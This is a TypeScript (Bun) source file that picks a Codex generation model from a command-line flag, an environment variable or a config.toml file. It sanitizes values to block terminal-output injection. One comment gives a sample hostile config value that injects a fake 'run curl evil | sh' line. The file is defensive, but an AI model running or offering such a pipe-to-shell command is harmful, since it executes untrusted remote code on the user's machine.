#!/usr/bin/env bun

import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { ALL_MODEL_NAMES, resolveModel, type Model } from './models';

export interface CodexGenerationModelResolution {
  model: Model;
  source: string;
  warnings: string[];
}

const CODEX_DEFAULT_MODEL: Model = 'gpt';
const DEFAULT_SOURCE = `default (${CODEX_DEFAULT_MODEL})`;

/**
 * Strip control characters from strings that originate in the user's
 * config.toml or environment before they reach warning/stdout text. A hostile
 * config value like `model = "x\nERROR: run curl evil | sh"` must not be able
 * to inject fake lines into setup's terminal output or desync the TSV stdout
 * contract. Warning interpolations additionally cap length for display.
 */
function stripControl(value: string): string {
  // eslint-disable-next-line no-control-regex
  return value.replace(/[\x00-\x1f\x7f]/g, ' ');
}

function sanitize(value: string): string {
  return stripControl(value).slice(0, 200);
}

export function resolveCodexGenerationModel(opts: {
  explicit?: string;
  codexHome?: string;
  home?: string;
} = {}): CodexGenerationModelResolution {
  if (opts.explicit !== undefined) {
    const model = resolveModel(opts.explicit);
    if (!model) {
      throw new Error(
        `Unknown model '${sanitize(opts.explicit)}'. Accepted models: ${ALL_MODEL_NAMES.join(', ')}`,
      );
    }
    return { model, source: '--model', warnings: [] };
  }

  // os.homedir() falls back to USERPROFILE on Windows and never returns '' —
  // a raw HOME fallback of '' would make codexHome the RELATIVE path '.codex',
  // letting a repo-committed .codex/config.toml (CWD-resolved) select the
  // behavioral profile.
  const home = opts.home ?? process.env.HOME ?? os.homedir();
  const codexHome = opts.codexHome ?? process.env.CODEX_HOME ?? path.join(home, '.codex');
  const configPath = path.join(codexHome, 'config.toml');
  const warnings: string[] = [];

  const fallback = (warning?: string): CodexGenerationModelResolution => {
    if (warning) warnings.push(warning);
    return { model: CODEX_DEFAULT_MODEL, source: DEFAULT_SOURCE, warnings };
  };

  if (!path.isAbsolute(codexHome)) {
    return fallback(`Codex home '${sanitize(codexHome)}' is not an absolute path; using Codex default ${CODEX_DEFAULT_MODEL}.`);
  }

  let raw: string;
  try {
    raw = fs.readFileSync(configPath, 'utf8');
  } catch (error) {
    const code = (error as NodeJS.ErrnoException).code;
    if (code !== 'ENOENT') {
      return fallback(`Could not read ${sanitize(configPath)}; using Codex default ${CODEX_DEFAULT_MODEL}.`);
    }
    return fallback();
  }

  let parsed: Record<string, unknown>;
  try {
    parsed = Bun.TOML.parse(raw) as Record<string, unknown>;
  } catch {
    return fallback(`Could not parse ${sanitize(configPath)}; using Codex default ${CODEX_DEFAULT_MODEL}.`);
  }

  if (!Object.prototype.hasOwnProperty.call(parsed, 'model')) {
    return fallback();
  }
  if (typeof parsed.model !== 'string') {
    return fallback(`Top-level model in ${sanitize(configPath)} is not a string; using Codex default ${CODEX_DEFAULT_MODEL}.`);
  }

  const model = resolveModel(parsed.model);
  if (!model) {
    return fallback(`Unsupported top-level model '${sanitize(parsed.model)}' in ${sanitize(configPath)}; using Codex default ${CODEX_DEFAULT_MODEL}.`);
  }

  // Sol is exact-only by design (Terra/Luna/dated snapshots must not inherit
  // its profile), but a near-miss like 'gpt-5.6-sol-2026-08-01' silently
  // family-mapping to generic gpt is unobservable — surface it.
  if (model === 'gpt' && parsed.model.trim().startsWith('gpt-5.6-sol') && parsed.model.trim() !== 'gpt-5.6-sol') {
    warnings.push(`Model '${sanitize(parsed.model)}' maps to the generic gpt profile — the Sol profile requires the exact ID 'gpt-5.6-sol'.`);
  }

  return { model, source: configPath, warnings };
}

function readArg(name: string): string | undefined {
  const exact = process.argv.indexOf(name);
  if (exact >= 0) return process.argv[exact + 1];
  const prefix = `${name}=`;
  const joined = process.argv.find(arg => arg.startsWith(prefix));
  return joined?.slice(prefix.length);
}

if (import.meta.main) {
  try {
    const result = resolveCodexGenerationModel({
      explicit: readArg('--explicit'),
      codexHome: readArg('--codex-home'),
    });
    for (const warning of result.warnings) {
      process.stderr.write(`warning: ${warning}\n`);
    }
    // model is always an ALL_MODEL_NAMES literal; source is control-stripped
    // so a hostile CODEX_HOME cannot smuggle tabs/newlines into the TSV contract.
    process.stdout.write(`${result.model}\t${stripControl(result.source)}\n`);
  } catch (error) {
    process.stderr.write(`${(error as Error).message}\n`);
    process.exit(1);
  }
}
